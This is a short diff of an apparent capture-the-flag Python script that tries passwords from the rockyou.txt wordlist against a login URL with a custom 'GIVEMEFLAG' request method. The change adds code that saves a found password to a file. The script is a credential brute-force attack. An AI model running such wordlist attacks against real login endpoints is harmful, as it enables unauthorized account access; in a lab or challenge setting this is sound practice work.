@@ -36,8 +36,8 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
         while True:
             try:
                 response = requests.request(
-                    "GIVEMEFLAG", 
-                    login_url, 
+                    method="GIVEMEFLAG", 
+                    url=login_url, 
                     headers=login_headers, 
                     timeout=1
                 )
@@ -48,6 +48,8 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
                 print("connect timeout, retry")
         if 'You have not been verified' not in response.text:
             print(f"found password!: {line}")
+            with open('output.txt', 'w') as output_file:
+                output_file.write(f"found password!: {line}\n")  # Write to file
             break
         # time.sleep(0.5)
 
